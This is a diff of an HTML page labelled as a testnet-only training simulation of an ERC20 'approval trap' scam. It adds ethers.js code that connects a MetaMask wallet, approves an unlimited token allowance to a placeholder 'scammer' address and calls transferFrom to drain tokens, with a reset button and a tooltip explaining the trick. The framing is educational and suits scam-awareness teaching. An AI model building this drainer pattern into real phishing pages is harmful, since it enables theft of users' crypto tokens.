@@ -1,127 +1,161 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8" />
   <title>Level 1 — ERC20 Approval Trap</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body {
       font-family: sans-serif;
-      background: #111;
-      color: #fff;
+      background: #0d1117;
+      color: #f1f1f1;
       margin: 0;
-      padding: 0;
+    }
+    .top-bar, .warning-bar {
+      padding: 1rem;
+      text-align: center;
+      font-weight: bold;
+    }
+    .top-bar {
+      background: #161b22;
+    }
+    .warning-bar {
+      background: #d32f2f;
+      color: #fff;
     }
     .container {
-      max-width: 800px;
-      margin: 40px auto;
-      padding: 20px;
-      background: #1e1e1e;
-      border-radius: 12px;
+      max-width: 600px;
+      margin: auto;
+      padding: 2rem;
     }
-    h1 {
-      color: #ff9800;
-    }
-    .toggle {
+    .toggle-group {
       display: flex;
       justify-content: center;
       gap: 1rem;
-      margin: 1rem 0;
-    }
-    .toggle label {
-      padding: 0.5rem 1rem;
-      border-radius: 8px;
-      cursor: pointer;
-      background: #333;
-    }
-    .toggle input[type="radio"] {
-      display: none;
-    }
-    .toggle input[type="radio"]:checked + label {
-      background: #4caf50;
-      color: #fff;
+      margin-bottom: 1rem;
     }
     .button-group {
       display: none;
-      gap: 10px;
-      flex-wrap: wrap;
+      flex-direction: column;
+      gap: 1rem;
       margin-top: 1rem;
     }
     .button-group.active {
       display: flex;
     }
     button {
-      padding: 0.75rem 1.5rem;
-      font-size: 1rem;
       background: #ff9800;
-      color: #fff;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
+      padding: 1rem;
+      color: #fff;
+      font-size: 1rem;
       cursor: pointer;
     }
-    #status {
-      margin-top: 1.5rem;
-      background: #222;
+    .tooltip {
+      background: #1e293b;
+      margin-top: 2rem;
       padding: 1rem;
       border-left: 4px solid #ff9800;
-      white-space: pre-wrap;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
+  <div class="top-bar">🎯 Approve & Pray — Level 1</div>
+  <div class="warning-bar">⚠️ Simulation Only — Use Sepolia Testnet + Burner Wallet</div>
+
   <div class="container">
-    <h1>🎯 Level 1: ERC20 Approval Trap</h1>
-    <p>Test simulation of a scam using token approvals. Toggle between full drain simulation or step-by-step mode.</p>
-
-    <div class="toggle">
-      <input type="radio" id="mode1" name="mode" value="drain" checked>
-      <label for="mode1">Drain Simulation</label>
-
-      <input type="radio" id="mode2" name="mode" value="step">
-      <label for="mode2">Transaction Simulation</label>
+    <div class="toggle-group">
+      <button id="mode1Btn">🧪 Drain Simulation</button>
+      <button id="mode2Btn">🔬 Step-by-Step</button>
     </div>
 
-    <div id="drain-buttons" class="button-group active">
-      <button id="connectBtn">Connect Wallet</button>
-      <button id="claimBtn" disabled>Claim Token</button>
+    <div id="mode1" class="button-group active">
+      <button id="connect1">Connect Wallet</button>
+      <button id="claimToken">Claim Token</button>
     </div>
 
-    <div id="step-buttons" class="button-group">
-      <button id="connectBtnStep">Connect Wallet</button>
-      <button id="approveBtn" disabled>Approve Token (Claim)</button>
-      <button id="drainBtn" disabled>Drain Token (TransferFrom)</button>
-      <button id="resetBtn" disabled>Reset Allowance</button>
+    <div id="mode2" class="button-group">
+      <button id="connect2">Connect Wallet</button>
+      <button id="approveBtn">Approve Token</button>
+      <button id="drainBtn">TransferFrom</button>
+      <button id="resetBtn">Reset Allowance</button>
     </div>
 
-    <div id="status">🕹️ Status updates will appear here.</div>
+    <div id="status" style="margin-top:2rem;font-size:0.95rem;white-space:pre-wrap;"></div>
+
+    <div class="tooltip">
+      💡 <strong>What is <code>approve()</code>?</strong><br>
+      The <code>approve()</code> function lets another smart contract (like Uniswap or a staking site) spend your tokens.<br>
+      Phishing contracts abuse this by getting you to approve **them** instead—and then draining you anytime using <code>transferFrom()</code>.
+    </div>
   </div>
 
   <script>
-    const drainButtons = document.getElementById("drain-buttons");
-    const stepButtons = document.getElementById("step-buttons");
+    const mode1 = document.getElementById("mode1");
+    const mode2 = document.getElementById("mode2");
+    const status = document.getElementById("status");
 
-    document.querySelectorAll("input[name='mode']").forEach((input) => {
-      input.addEventListener("change", () => {
-        if (input.value === "drain" && input.checked) {
-          drainButtons.classList.add("active");
-          stepButtons.classList.remove("active");
-        } else if (input.value === "step" && input.checked) {
-          stepButtons.classList.add("active");
-          drainButtons.classList.remove("active");
-        }
-      });
-    });
+    document.getElementById("mode1Btn").onclick = () => {
+      mode1.classList.add("active");
+      mode2.classList.remove("active");
+      status.textContent = "Mode: Drain Simulation";
+    };
+    document.getElementById("mode2Btn").onclick = () => {
+      mode1.classList.remove("active");
+      mode2.classList.add("active");
+      status.textContent = "Mode: Step-by-Step";
+    };
 
-    // You can plug your existing contract logic below here
-    // This just sets up a test for UI toggle behavior
-    document.getElementById("connectBtn").addEventListener("click", () => {
-      document.getElementById("status").textContent = "🔌 Wallet connected (Drain Mode)";
-      document.getElementById("claimBtn").disabled = false;
-    });
+    let provider, signer, user, token, scammer;
+    const tokenAddress = "0xYourToken"; // replace
+    const scammerAddress = "0xScammer"; // replace
+    const tokenABI = [
+      "function approve(address,uint256) public returns (bool)",
+      "function transferFrom(address,address,uint256) public returns (bool)",
+      "function balanceOf(address) public view returns (uint256)"
+    ];
 
-    document.getElementById("connectBtnStep").addEventListener("click", () => {
-      document.getElementById("status").textContent = "🔌 Wallet connected (Step Mode)";
-      document.getElementById("approveBtn").disabled = false;
-    });
+    async function connect() {
+      if (!window.ethereum) return alert("Please install MetaMask.");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      user = await signer.getAddress();
+      token = new ethers.Contract(tokenAddress, tokenABI, signer);
+      status.textContent += `\n✅ Connected: ${user}`;
+    }
+
+    document.getElementById("connect1").onclick = connect;
+    document.getElementById("connect2").onclick = connect;
+
+    document.getElementById("claimToken").onclick = async () => {
+      status.textContent = "🚨 Claiming... (approve + transferFrom)";
+      const tx1 = await token.approve(scammerAddress, ethers.constants.MaxUint256);
+      await tx1.wait();
+      const tx2 = await token.transferFrom(user, scammerAddress, ethers.utils.parseEther("100"));
+      await tx2.wait();
+      status.textContent += `\n💀 Token drained in 1 click!`;
+    };
+
+    document.getElementById("approveBtn").onclick = async () => {
+      const tx = await token.approve(scammerAddress, ethers.constants.MaxUint256);
+      await tx.wait();
+      status.textContent += `\n✅ Token approved`;
+    };
+
+    document.getElementById("drainBtn").onclick = async () => {
+      const tx = await token.transferFrom(user, scammerAddress, ethers.utils.parseEther("100"));
+      await tx.wait();
+      status.textContent += `\n💀 transferFrom drained tokens`;
+    };
+
+    document.getElementById("resetBtn").onclick = async () => {
+      const tx = await token.approve(scammerAddress, 0);
+      await tx.wait();
+      status.textContent += `\n🛡️ Allowance reset to 0`;
+    };
   </script>
 </body>
 </html>
